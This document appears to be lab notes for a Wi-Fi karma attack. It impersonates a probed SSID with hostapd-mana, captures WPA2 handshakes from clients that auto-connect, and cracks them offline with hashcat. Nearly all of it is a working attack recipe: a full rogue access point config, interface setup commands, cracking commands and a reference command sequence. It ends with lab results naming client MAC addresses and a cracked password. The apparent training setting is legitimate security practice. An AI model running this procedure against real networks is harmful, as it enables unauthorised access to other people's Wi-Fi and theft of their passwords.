

## When to use

Target AP isn't currently broadcasting, but a client is still sending **probe requests** for it (visible in `airodump-ng`'s client table under `Probes`). Instead of waiting for the real AP, impersonate the SSID to lure the client into a handshake.

## How it works

- Clients broadcast probe requests for every SSID they've previously saved ("is X nearby?")
- `hostapd-mana` answers yes to whatever SSID is probed (karma attack)
- Client auto-connects (trusts the saved network) → EAPOL handshake begins
- You don't know the real password, so full auth fails (`AP-STA-POSSIBLE-PSK-MISMATCH`) — but **handshake messages 1+2 are enough** to crack offline

## Setup

Install:

```bash
sudo apt install hostapd-mana
```

Config file (`mana.conf`) — **watch the filename, not `mama.conf`**:

```
interface=wlan2
driver=nl80211
ssid=<target-ssid>
channel=<channel seen in probe traffic>
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=placeholder123
mana_wpaout=/home/user/handshake.hccapx
enable_mana=1
mana_macacl=0
```

Run:

```bash
sudo hostapd-mana mana.conf
```

## Troubleshooting

**"Could not open configuration file"** → Filename typo, or running from wrong directory. Confirm with `ls -la mana.conf` and `pwd`.

**`nl80211: kernel reports: key not allowed` / `Failed to set beacon parameters`** → Interface was in monitor mode or still controlled by NetworkManager/wpa_supplicant. Fix:

```bash
sudo airmon-ng check kill
sudo ip link set <iface> down
sudo iw dev <iface> set type managed
sudo ip link set <iface> up
```

Also confirm the adapter actually supports AP mode:

```bash
iw list | grep -A 10 "Supported interface modes"
```

→ Switching interface (e.g. to `wlan2`) resolved this in practice.

## Capturing the handshake

Watch the live output for:

```
MANA: Captured a WPA/2 handshake from: <client-mac>
MANA WPA2 HASHCAT | WPA*02*...
wlan2: AP-STA-POSSIBLE-PSK-MISMATCH <client-mac>
```

The mismatch is expected (auth will never fully succeed) — the hash is already captured and written to the `mana_wpaout` file.

## Cracking the handshake

⚠️ `mana_wpaout` writes hashcat's **22000 text format**, not binary `.hccapx` — despite the file extension. **aircrack-ng cannot read it.** Use hashcat.

The file also prefixes each line with a label + tab:

```
[WPA2-EAPOL HASHCAT]	WPA*02*...
```

Strip that prefix before feeding it to hashcat:

```bash
grep -oP 'WPA\*02\*.*' /home/user/handshake.hccapx > clean.hc22000
```

Crack:

```bash
hashcat -m 22000 clean.hc22000 /root/rockyou-top100000.txt
```

Check result later without re-running:

```bash
hashcat -m 22000 clean.hc22000 /root/rockyou-top100000.txt --show
```

Output format: `hash:...:essid:password` — password is the last field.

## Result (this lab)

- Target: `wifi-offices`
- Captured from clients: `78:c1:a7:bf:72:46`, `b4:99:ba:6f:f9:45` ("Jason")
- Password cracked: `password1`

## Full command sequence (reference)

```bash
sudo airmon-ng check kill
sudo iw dev wlan2 set type managed
sudo hostapd-mana mana.conf
# wait for handshake capture, then Ctrl+C
grep -oP 'WPA\*02\*.*' /home/user/handshake.hccapx > clean.hc22000
hashcat -m 22000 clean.hc22000 /root/rockyou-top100000.txt
```